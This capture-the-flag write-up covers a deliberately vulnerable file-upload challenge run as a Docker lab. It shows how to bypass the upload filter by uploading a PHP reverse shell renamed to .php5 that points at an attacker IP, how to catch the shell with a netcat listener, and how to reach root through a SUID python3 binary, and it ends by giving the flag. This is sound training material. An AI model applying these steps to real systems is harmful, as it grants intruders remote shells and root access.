## WRITEUP - STUDENT DROPBOX

Category: *web*
Level: *medium*

**Description** : Your professor asked you to submit the report for your school project. To make things easier, he created a simple platform where you can upload your work.

However, since he likes to test your curiosity, he intentionally left a vulnerability in the system. As an extra challenge, he announced **a bonus of 10 points on the final exam** to anyone who can retrieve the **flag** hidden in the root directory as proof.

--------------------------------------------------
## Step 1 : Launch the Docker Image

-   The image is available on my Docker Hub:

<pre>Link : https://hub.docker.com/repositories/razafindraibe</pre>

-   Pull the image:

<pre>docker pull razafindraibe/student_dropbox:latest</pre>

![alt text](imageswriteup/1.png)

-   Run a container from the image:

<pre>docker run --rm -d -p 80:80 -p 22:22 razafindraibe/student_dropbox:latest</pre>

![alt text](imageswriteup/2.png)

---------------------------------------------------

## Step 2 : Enumeration

-   First, check the Docker container’s IP address:

![alt text](imageswriteup/3.png)

![alt text](imageswriteup/4.png)

-   Let’s start with an **Nmap scan**:

![alt text](imageswriteup/5.png)

We can see that two ports are open: **80 (HTTP) and 22 (SSH)** — pretty standard.

- Next, let’s use <code>Gobuster</code> to look for hidden directories on the website:

![alt text](imageswriteup/6.png)

Interesting… we found two directories: <code>/student</code> and <code>/projects</code>.

-   Visiting the main page shows the default Apache landing page:

![alt text](imageswriteup/7.png)

C'est la page par defaut d'apache.

-   Navigating to <code>/student</code> reveals the upload page where we are supposed to submit our project reports :

![alt text](imageswriteup/8.png)

However, only <code>.zip</code> or <code>.gz</code> are allowed.

-  If we go to <code>/projects</code> , we can see the files that have been uploaded .

![alt text](imageswriteup/9.png)

-----------------------------------------------

## Step 3 : Exploitation

-   First, I tried uploading a simple <code>.txt</code> file to see how the application reacts :

![alt text](imageswriteup/10.png)

![alt text](imageswriteup/11.png)

Good job, teacher ! The server rejects it. I also tested with <code>.py </code>,<code>.php </code> etc ... all resulted in errors.

-   Uploading a <code>zip</code> , and <code>gz</code>, et y a pas erreur mais , file does not trigger an error, but nothing appears under <code>/projects</code>. Suspicious…

-   Time to try something more interesting : a <code>PHP reverse shell</code> et Before that, let’s prepare our listener : <code>nc -lvnp 4444</code>

- I used the classic : <code> https://github.com/pentestmonkey/php-reverse-shell </code>

![alt text](imageswriteup/12.png)

**Steps** :

1- Copy the content of <code>php-reverse-shell.php</code>

2- Create a new file, but change the extension to <code>php5</code> or <code>php4</code>

![alt text](imageswriteup/13a.png)

3- Paste the reverse shell code and edit the following variables:

<pre>
    -   $IP = [YOUR_ATTACKER_IP]
    -   $PORT = what you want (I choose 4444)
</pre>

![alt text](imageswriteup/13.png)

4- Upload the modified <code>reverse shell.</code>

![alt text](imageswriteup/14.png)

Bingo 🎉 — the file extension is accepted!

5- Check the <code>/projects</code> directory:

![alt text](imageswriteup/15.png)

6- Start the <code>netcat</code> listener :

![alt text](imageswriteup/16.png)

7- Click on the uploaded <code>shell.php5</code>

8- Go back to  <code>netcat</code> ....

![alt text](imageswriteup/17.png)

🎯 Success! We now have a working <code>reverse shell</code> on the target.

-----------------------------------------------

## Step 4 :  Privilege Escalation

-   First, I checked for available sudo permissions with: <code>sudo -l</code> . But nothing useful showed up:

![alt text](imageswriteup/18.png)

-    Next, I searched for <code>SUID binaries</code> that might allow privilege escalation: 

<pre>find / -perm -4000 -type f 2>/dev/null</pre>

![alt text](imageswriteup/19.png)

Interesting… we found <code>/usr/bin/python3.10</code>, owned by root.
If we can run this, it should allow us to escalate privileges.

-   Time to check **GTFOBins** for a Python SUID exploit:

![alt text](imageswriteup/20.png)

![alt text](imageswriteup/21.png)

-   Running the suggested command directly threw an error:

![alt text](imageswriteup/22.png)

-    That’s because the binary is <code>python3</code> not <code>python</code>.

Adjusting the command accordingly…

![alt text](imageswriteup/23.png)

💥 Boom! Root access obtained.

-   Now, let’s search for the <code>flag</code> to earn the professor’s <code>+10 bonus points:</code>

![alt text](imageswriteup/24.png)

![alt text](imageswriteup/25.png)

<pre>flag{4rbitr4ry_f1le_uplo4d_to_rce}</pre>
